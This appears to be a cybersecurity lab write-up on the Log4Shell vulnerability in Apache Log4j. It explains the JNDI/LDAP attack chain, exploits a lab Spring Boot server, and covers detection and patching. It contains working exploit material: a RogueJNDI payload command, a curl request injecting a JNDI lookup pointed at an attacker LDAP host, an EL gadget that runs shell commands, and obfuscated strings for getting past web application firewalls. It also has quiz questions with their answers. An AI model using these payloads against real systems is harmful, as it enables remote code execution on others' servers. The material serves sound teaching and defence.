# CVE-2021-44228 Log4Shell

Log4Shell is a remote code execution vulnerability affecting the Apache Log4j logging library versions 2.0 to 2.14.1. In this module, you will learn how the vulnerability works, attempt to exploit a vulnerable service and see how to detect and mitigate the issue in your own applications.

CVSS Base Score: 10
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Vulnerability Overview

In the following steps, you are given a brief overview of the specific functionality inside Log4j that is vulnerable and how it can be exploited by an attacker.

### Log4j

Log4j is an open-source logging API for Java created and maintained by the Apache Software Foundation. It enables developers to have a common, easy-to-use framework to log data.

For example, have a look at the following implementation in a simple Java class. Note that the **Logger** class from the Log4j library is imported at the beginning of the snippet and that the **logger.info** call is used to append a line of text to the console:

```java
import org.apache.log4j.Logger;

public class LogClass {
   private static Logger logger = Logger.getLogger(LogClass.class);
   
   public static void main(String[] args) {
      logger.info("Info Message!");
   }
}
```

It is important to mention that Log4j allows for special syntax in the form of `${prefix:name}` where `prefix` is a **lookup** for which `name` should be **evaluated**.

For example, `${java:version}` translates to the current running version of Java:

```java
logger.info("Using Java: ${java:version}");
```

Here are a few more lookup examples:

- `${sys:os.name}`
- `${sys:user.name}`
- `${env:PATH}`

### JNDI and LDAP

The **Java Naming and Directory Interface (JNDI)** is an API that allows Java code to find data from a directory service. JNDI has multiple service provider interfaces (SPIs), and implementations exist for CORBA COS (Common Object Service), the Java RMI (Remote Method Interface) and LDAP.

**Lightweight Directory Access Protocol (LDAP)** is a very popular directory service and is the primary focus of CVE-2021-44228. Researchers have noted that there may be possible exploitation flows using other interfaces than LDAP, such as RMI and DNS.

In the case of Log4j, JNDI and LDAP can be used together since version [2.0-beta9](https://issues.apache.org/jira/browse/LOG4J2-313) to enrich any log lines with data from the directory service. After this change, log messages parsed by Log4j that include the following syntax will be evaluated:

```java
${jndi:context}
```


As per the [JNDI Lookup documentation](https://logging.apache.org/log4j/2.x/manual/lookups.html#Jndi_Lookup), the LDAP server to be used for lookups should be set using the `log4j.xml` configuration file:

```java
<File name="Application" fileName="application.log">
  <PatternLayout>
    <pattern>%d %p %c{1.} [%t] $${jndi:provider-url/context-name} %m%n</pattern>
  </PatternLayout>
</File>
```

> Note: The `%m` argument is the actual message being extended with the timestamp and other metadata according to the configured log pattern.

**As it turns out, it is possible to give the JNDI Lookup plugin an absolute LDAP URL, which will be used as-is**. The following example code will try to extend the log message by first resolving the **my-ldap-server.lab** domain name using DNS and then connecting to the server using LDAP:

```java
import org.apache.log4j.Logger;

public class LogClass {
   private static Logger logger = Logger.getLogger(LogClass.class);
   
   public static void main(String[] args) {
      logger.info("Info Message! ${jndi:ldap://my-ldap-server.lab/o=Test}");
   }
}
```

### User Input

In order for the exploit to work, the attacker would need to get control over the contents of the log message so that the exploit string is included. This could be a common HTTP header, such as User-Agent, or any request parameter that is being sent to the logs as-is.

> Note: In the case of vulnerable Minecraft: Java Edition servers, it was enough to join a hosted game and send an in-game chat message that included the malicious `${jndi:ldap://malicious-domain/anything}` string to trigger the exploit.

For example, the following Spring Boot web application does exactly that: the **X-Api-Version** can be set to anything by the user, and it is logged using Log4j.

```java
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RestController;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

@RestController
public class MainController {

    private static final Logger logger = LogManager.getLogger("HelloWorld");

    @GetMapping("/")
    public String index(@RequestHeader("X-Api-Version") String apiVersion) {
        logger.info("Received a request for API version " + apiVersion); // Vulnerable: accepts user input via request headers!
        return "Hello, world!";
    }

}
```

As you can see, it is not unlikely that some sort of user-controlled input is logged in Java applications that use Log4j.

> Note: Tesla was [confirmed to be affected](https://github.com/YfryTchsGD/Log4jAttackSurface/blob/master/pages/Tesla.md) by setting the name of a Model 3 to the exploit string.

It is possible that Java applications that are not publicly accessible on the internet can still be exploitable. Imagine a `User-Agent` string containing the exploit that is passed to a service written in Java (such as Logstash or Elasticsearch) that indexes or analyzes the data.

### Malicious LDAP Server

Moritz Bechler said in a [blog post](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633/) on January 20, 2018 that JDNI has a "crazy feature" — the native ability to store Java objects in LDAP, including remote codebase references:

> [...] Essentially controlling the lookup name or the directory contents in conjunction with these calls leads to both the ability to launch a **Java deserialization attack** (encoded objects in tree) or **direct code execution** (through JNDI Reference factory loading).

This is exactly what is happening in the case of CVE-2021-44228. As the attacker has control over the lookup name and the LDAP server being queried, they can configure it to reply with a malicious LDAP response that contains a remote codebase URL to be downloaded and executed. This exploitation flow can be seen in the following diagram:

![Screenshot 2024-04-20 065656](https://github.com/acibojbp/RangeForce-Community/assets/164168280/d8f6f134-513f-41c7-9bec-77e09ac19acf)

![Screenshot 2024-04-20 070129](https://github.com/acibojbp/RangeForce-Community/assets/164168280/17080e1b-9c7c-45d5-90f3-792daa6629c7)

Java versions before 8u191 (about 3 years old at the time of publishing Log4Shell) have a direct path from a controlled JNDI lookup to remote class loading of arbitrary code. For more recent versions of the Java runtime, the deserialization attack still works and is detailed in the following step.

> Note: Log4j allows nested lookups! An attacker could find out which Java version is the target using by leaking it via DNS: `${jndi:ldap://${java:version}.malicious.com/a}`


### Insecure Deserialization

With more recent versions of Java (since 6u211, 7u201, 8u191, and 11.0.1), it is not possible to supply a Java class to be directly downloaded and executed because `com.sun.jndi.ldap.object.trustURLCodebase` has been set to `false` by default. In that case, the attacker has to rely on having a malicious serialized entry on the LDAP server. Upon deserialization on the vulnerable target, the included code will be executed.

The deserialization code that exists on the target server and is then leveraged to gain execution is called a **gadget**. There are a few deserialization gadgets implemented in the open-source tool [RogueJNDI](https://github.com/veracode-research/rogue-jndi) to target Tomcat, Groovy and WebSphere applications.

As an example, take a look at the following payload created by RogueJNDI to target Tomcat applications. It relies on having the tomcat-embed-core.jar and tomcat-embed-el.jar libraries loaded on the target application, which is the default for Tomcat applications after version 8. Note how the gadget uses the `javax.script.ScriptEngineManager` to execute commands on the target host:

```java
{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','echo malicious']).start()")}
```

For more information on such gadgets, have a look at the [marshalsec](https://github.com/mbechler/marshalsec) toolset made by Moritz Bechler.

Here is how the serialized payload looks like when queried with `ldapsearch`:

![Screenshot 2024-04-20 070231](https://github.com/acibojbp/RangeForce-Community/assets/164168280/01abe123-cd92-44d0-a1b8-b950b52aee44)


> Note: Before Log4Shell, the target application had to explicitly and insecurely deserialize user provided objects such as the one above to be vulnerable, but Log4Shell allows attackers to exploit the target by writing a simple string to a log file.

As you may have seen, the technical explanation of the vulnerability can get quite complex on its own, but **it is not difficult to exploit the vulnerability** using off-the-shelf tools. In the next step, you will be going through the exploitation process yourself.

## Practical Example

In the following steps, you will start a malicious LDAP server on your Kali machine and trigger the exploit with a simple web request to the target application.

### Serve Payload

For the malicious LDAP server, you will be using [RogueJNDI](https://github.com/veracode-research/rogue-jndi). It is a tool specifically meant for JNDI injection attacks and works well to demonstrate CVE-2021-44228. The tool has been built and placed in the `/root/Desktop/workspace` directory in your Kali environment.

Run the following command to compile and serve payloads that run the `touch /tmp/rce-proof` command when successfully executed:

```java
java -jar /root/Desktop/workspace/RogueJndi.jar --command "touch /tmp/rce-proof"
```

This way, if you can see the `/tmp/rce-proof` file being created then you have confirmed that the target application is vulnerable.

> Note: You should keep the terminal window open while performing the attack. Closing the terminal will terminate RogueJNDI.

Once you have RogueJNDI running, the LDAP server will be accessible on your Kali desktop at **192.168.6.1** on port **1389**. In the next step, you will get to trigger the exploit with a simple web request.

- Run the RogueJNDI tool to craft and serve payloads
	- Location: `/root/Desktop/workspace/RogueJndi.jar`
	- Specify command `touch /tmp/rce-proof`

![Screenshot 2024-04-20 070744](https://github.com/acibojbp/RangeForce-Community/assets/164168280/bfa96b8c-d29b-4d1a-a3a0-7df490d5788c)

![Screenshot 2024-04-20 070805](https://github.com/acibojbp/RangeForce-Community/assets/164168280/61e474e5-cd90-4cd1-b8c6-05cb9018570f)

### Exploit

Your target is a minimal vulnerable Spring Boot web application using the embedded Tomcat web server and utilizing the Log4j library. It is hosted at `http://server:8080/` .

This web application accepts GET requests to the root `/` path and expects the `X-Api-Version` header to be specified, which is then logged.

For reference, here is the relevant source code from the vulnerable target:

```java
@GetMapping("/")
public String index(@RequestHeader("X-Api-Version") String apiVersion) {
    logger.info("Received a request for API version " + apiVersion); // Vulnerable: accepts user input via request headers!
    return "Hello, world!";
}
```

Run the following command in a new terminal window to exploit the webserver;

`curl http://server:8080/ -H 'X-Api-Version:${jndi:ldap://192.168.6.1:1389/o=tomcat}'`

This will make a request to the web server running on `server:8080` and inject `${jndi:ldap://192.168.6.1:1389/o=tomcat}` into the logs via the `X-Api-Version` header, after which the payload served in your LDAP server will be retrieved and executed, thus achieving remote code execution.

- Exploit the target web server
	- Send a GET HTTP request to `http://server:8080/`
	- Specify `X-Api-Version` header with value `${jndi:ldap://192.168.6.1:1389/o=tomcat}`

### Confirmation

You should be able to see the request in the RogueJNDI logs, which confirms that an LDAP query was made back to the Kali machine:

![Screenshot 2024-04-20 071531](https://github.com/acibojbp/RangeForce-Community/assets/164168280/087fa33e-987d-4af2-8feb-33921498b081)

To confirm the `/tmp/rce-proof` file was created on the target server, you should connect to the vulnerable server via SSH from your desktop:

`ssh student@server`

From there, you should be able to list files in `/tmp` with `ls -l /tmp` :

![Screenshot 2024-04-20 071838](https://github.com/acibojbp/RangeForce-Community/assets/164168280/768df246-d57c-46fb-91a5-c229d591148f)

You should also investigate the logs of the vulnerable service with `sudo journalctl -u spring-boot-application` . Note that the exploit string has been substituted in the application logs:


- Connect to the vulnerable server using SSH:
	- Username: **student**
	- Sudo privileges: **yes**
- Elevate privileges to root.
- Investigate the logs of the vulnerable application.
- Answer the question below.

![Screenshot 2024-04-20 072010](https://github.com/acibojbp/RangeForce-Community/assets/164168280/df066582-3307-4a0f-9b4d-2921ef09e850)

![Screenshot 2024-04-20 072128](https://github.com/acibojbp/RangeForce-Community/assets/164168280/f17cacea-c6d5-401f-a242-9dc8ecea0138)

**After successful exploitation, what is the malicious `${jndi:...}` lookup string replaced with?**  
`javax.el.ELProcessor@67481ea1`

## Impact

The fact that the use of Log4j is very widespread makes the vulnerability extremely dangerous. Combined with how easy it is to take advantage of it, it is not difficult to call it the most serious vulnerability of recent years.

"This vulnerability is one of the most serious that I've seen in my entire career, if not the most serious,"

— Jen Easterly, director of the US Cybersecurity and Infrastructure Security Agency (CISA), [said on a phone call shared with CNN](https://edition.cnn.com/2021/12/13/politics/us-warning-software-vulnerability/index.html).

It is hard to say how many applications are affected exactly, but many services and many organizations have already been confirmed to be vulnerable to this exploit.

Anybody using **Apache Struts**, **Solr**, **Elasticsearch** or **Hadoop** is likely vulnerable. Many Java application frameworks, such as **Tomcat** or **Spring Boot**, are often bundled to use Log4j. **Apple**, **Tencent**, **Steam**, **Twitter**, **Baidu**, **Amazon**, **Tesla**, **Google** and **LinkedIn** were likely affected by Log4Shell as is demonstrated in this [GitHub](https://github.com/YfryTchsGD/Log4jAttackSurface) repository. As an example, simply [changing an iPhone's name](https://twitter.com/chvancooten/status/1469340927923826691) has been shown to trigger the vulnerability in Apple's servers.

There is a well-maintained, curated list of artifacts, compromised applications and responses from various vendors available on [GitHub](https://github.com/authomize/log4j-log4shell-affected).

> Note: Data can be passed among services and could end up in the logs of services which are not directly accessible from the web.

## Response

In the following steps, you will take a look at some of the ways to find vulnerable instances of Log4j and how to detect and block exploitation attempts in your organization:

1. Identify vulnerable software and servers.
2. Patch vulnerable software for which vendor patches are available, alternatively mitigate through configuration changes.
3. Limit network egress from hosts where vulnerable software exists when possible.
4. Apply continuous monitoring for exploitation attempts.

### Identifying the Vulnerability

The first step in responding to the Log4Shell disclosure is to figure out all of the places where the vulnerable software is running. Log4j is very widely used in many application stacks and it might not be immediately obvious that your organization is affected.

You should investigate your asset inventory, software bill of material manifests and software build pipeline dependency manifests to see whether there are any indications of Log4j being used. If uncertain, consider scanning your hosts for Java code, specifically if "log4j" is found in any files or filenames. You can leverage various scanners for this, such as [this scanner written in Go](https://github.com/hillu/local-log4j-vuln-scanner) to search for vulnerable `.jar` and `.class` files recursively. In case of continuous integration pipelines, [Snyk](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-44228/) and [Docker Scan](https://github.com/docker/scan-cli-plugin) can scan your job artifacts for vulnerabilities such as Log4Shell. It's possible to find vulnerable versions of Log4j using [YARA rules](https://github.com/darkarnium/Log4j-CVE-Detect).

Most vendors have released security bulletins stating which versions of their applications are affected, alongside with remediation steps. Examples of this are [IBM](https://www.ibm.com/support/pages/security-bulletin-vulnerability-apache-log4j-affects-websphere-application-server-cve-2021-44228), [Amazon AWS](https://aws.amazon.com/security/security-bulletins/AWS-2021-006/), [SAS](https://support.sas.com/en/security-bulletins/remote-code-execution-vulnerability-cve-2021-44228.html), [Imperva](https://www.imperva.com/blog/how-were-protecting-customers-staying-ahead-of-cve-2021-44228/) and many others are mentioned in [compiled lists](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592) available on the web.

If you are uncertain about where the data of your web application may end up, you could also run automated scans against your web applications. You do not immediately need to set up an LDAP server for this — instead, [canary tokens](https://twitter.com/ThinkstCanary/status/1469439743905697797) can be used in the JNDI URL to detect susceptibility to Log4Shell. Additionally, scanners such as [log4j-scan](https://github.com/fullhunt/log4j-scan) and the [Log4Scanner](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f) extension for Burp Suite may help finding vulnerable web applications.

> Note: Only test applications that you own or that you are explicitly permitted to test! Otherwise, the testing could be considered to be an attempt of a malicious attack, possibly landing you in legal trouble.

Additional resources:

- A [Python3 script](https://github.com/fox-it/log4j-finder) from Fox IT to scan the filesystem to find Log4j2 that is vulnerable to Log4Shell, recursively scans disk and inside JAR files
- List of [vulnerable JAR file hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes) from mubix
- Another [list of file hashes that includes .class files](https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228)
- [PowerShell script](https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1) to recursively search for Log4j on Windows hosts
- Linux command-line search for Log4j: `find / 2>/dev/null -regex ".*.jar" -type f | xargs -I{} grep JndiLookup.class "{}"`
- A set of [YARA rules](https://github.com/darkarnium/Log4j-CVE-Detect) for detecting versions of log4j which are vulnerable to CVE-2021-44228 by looking for the signature of JndiManager prior to 2.15.0.
- Local recursive [Log4j detector](https://github.com/mergebase/log4j-detector) written in Java

### Patching

There are multiple ways to patch Log4j, as detailed in the official guidelines.

**Full mitigation**

- Java 8 (or later) users should **upgrade to release v2.16.0**. This upgrade disables JNDI lookups within log messages by default.
- Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available
- Otherwise, remove the JndiLookup class from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

**Hot patching**

The [NCC Group](https://research.nccgroup.com/2021/12/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/) has published a [hot patch](https://github.com/corretto/hotpatch-for-apache-log4j2) that can be applied without restarting any services. It is a tool that injects a Java agent into a running JVM process and attempts to patch the `lookup()` method on all loaded `org.apache.logging.log4j.core.lookup.JndiLookup` instances.

**Disable lookups**

Disabling lookups is an incomplete mitigation, as there are code paths in Log4j where message lookups could still happen. This is detailed in the follow-up [CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046).

- If you are using Log4j v2.10 or above and cannot upgrade, then set the property `log4j2.formatMsgNoLookups=true` .
- You can also edit the `log4j.xml` configuration and change the `%m` message parameter to `%{nolookups}m` .

### Network Egress Filtering

It is also possible to somewhat mitigate the effects of Log4Shell exploitation attempts by limiting outgoing network traffic. Using host or network firewalls provide a layer of a strong defense-in-depth strategy.

- Disallow LDAP and RMI traffic to/from untrusted networks and unexpected sources. This blocks the payload downloading process, effectively mitigating remote code execution, but does not block exfiltration of secrets via DNS requests.
- For defending against any DNS-based information exfiltration attacks, consider limiting which hosts are able to make external DNS requests.


### Exploitation Attempts

There are various rulesets available to detect and block Log4Shell activity: [Yara](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_log4j_cve_2021_44228.yar), [Snort and Suricata](https://rules.emergingthreatspro.com/open/) by EmergingThreats. Most cloud providers also include support for detecting most Log4Shell attacks in their web application firewall (WAF) or intrusion detection/prevention system (IDPS) offerings.

> Note: Due to the nested resolution of `${...}` lookups and multiple available obfuscation and encoding methods, any detection method based on regular expressions **cannot** guarantee 100% coverage. **It is impossible to write an exhaustive regular expression to detect Log4Shell exploitation attempts.**

While a WAF or an IDPS should be able to detect and block most basic exploitation attempts, it is important to note that nested lookups make it possible for the attackers to obfuscate the exploitation string, making this defensive tactic only somewhat effective.

For example, if the input `${jndi:ldap` was blocked by the WAF, the attackers could try to bypass it with obfuscation:

- `${jndi:${lower:l}${lower:d}a${lower:p}`
- `${${::-j}${::-n}${::-d}${::-i}:ldap`
- `${${env:XXX:-j}ndi${env:XXX:-:}${env:XXX:-l}dap`

There exists a publicly available [script that generates obfuscated Log4Shell payloads](https://github.com/woodpecker-appstore/log4j-payload-generator) — you should use it to test the effectiveness of your web application firewall and intrusion prevention system.

## Review

- Answer the questions below.

**Which of the following Log4j versions are affected by CVE-2021-44228?**

**v2.0.0**  
**v2.1.0**  
**v2.11.0**  
v2.16.0  
v1.2.15  

**After which Java 8 version was the `com.sun.jndi.ldap.object.trustURLCodebase` property set to be `false` by default?**  
`u191`

**What is the CVSS base score of the Log4Shell vulnerability?**  
`10`







